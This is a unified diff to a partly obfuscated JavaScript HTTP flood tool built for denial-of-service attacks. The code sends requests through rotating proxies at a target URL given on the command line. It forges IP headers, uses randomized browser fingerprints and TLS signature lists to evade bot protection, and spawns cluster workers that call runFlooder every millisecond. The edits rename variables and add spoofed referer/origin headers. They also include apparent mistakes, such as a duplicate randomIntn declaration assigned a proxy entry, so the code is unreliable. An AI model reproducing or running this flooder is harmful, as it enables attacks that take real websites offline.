@@ -297,9 +297,15 @@ function getTitleFromHTML(_0x330231) {
   }
   return "Not Found";
 }
-function randomIntn(_0x37244a, _0x5e8397) {
-  return Math.floor(Math.random() * (_0x5e8397 - _0x37244a) + _0x37244a);
+
+function randomElement(elements) {
+  return elements[randomIntn(0, elements.length)];
+} 
+
+function randomIntn(min, max) {
+  return Math.floor(Math.random() * (max - min) + min);
 }
+
 function randstr(_0x6ba01d) {
   var _0x404460 = '';
   var _0x1b31e9 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length;
@@ -330,10 +336,12 @@ function randnombor(_0x3af870) {
 function randomElement(_0x21da9f) {
   return _0x21da9f[Math.floor(Math.random() * (_0x21da9f.length - 0x0) + 0x0)];
 }
+
 const ip_spoof = () => {
   return Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 100);
 };
-const spoofed = Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 100);
+const  randomIntn = randomElement(proxies);
+const spoofed = ip_spoof();
 const args = {
   'target': process.argv[2],
   'time': ~~process.argv[3],
@@ -401,6 +409,7 @@ if (cluster.isMaster) {
 } else {
   setInterval(runFlooder, 0x1);
 }
+
 const sig = [
              "ecdsa_secp256r1_sha256", 
              "ecdsa_secp384r1_sha384", 
@@ -2348,7 +2357,12 @@ const version = [
                  "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"86\", \"Chromium\";v=\"86\"", 
                  "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"96\", \"Chromium\";v=\"96\"", 
                  "\"Not_A Brand\";v=\"24\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\", \"Opera GX\";v=\"106\""];
-const browsers = [
+const browsers = [ 
+                "Windows",
+                "macOS",
+                "Linux",
+                "iOS",
+                "Android",
                 "Chrome",
                 "Edge",
                 "Microsoft Edge", 
@@ -2360,6 +2374,8 @@ const browsers = [
                 "Samsung Internet", 
                 "WebView Android"];  
 const sechuas = [
+                "?0", 
+                "?1",
                 "",
                 "?0",
                 "117.0.5408.197",
@@ -2488,14 +2504,16 @@ headers.Pragma = "akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-ca
 headers['x-frame-options'] = randomHeaders["x-frame-options"];
 headers["x-xss-protection"] = randomHeaders["x-xss-protection"];
 function runFlooder() {
-  const _0x4547fe = proxies[Math.floor(Math.random() * (proxies.length - 0x0) + 0x0)];
-  const _0x1f7c48 = _0x4547fe.split(':');
+  const proxyAddr = proxies[Math.floor(Math.random() * (proxies.length - 0x0) + 0x0)];
+  const parsedProxy = proxyAddr.split(':');
   headers.origin = 'https://' + parsedTarget.host;
+  headers["referer"] = "https://" + parsedTarget.host + "/?" + randstr(15);
+  headers["origin"] = "https://" + parsedTarget.host;
   headers[":authority"] = parsedTarget.host;
   headers["user-agent"] = moz + az1 + uap1;
   const _0x50454d = {
-    'host': _0x1f7c48[0x0],
-    'port': ~~_0x1f7c48[0x1],
+    'host': parsedProxy[0x0],
+    'port': ~~parsedProxy[0x1],
     'address': parsedTarget.host + ":443",
     'timeout': 0x64
   };
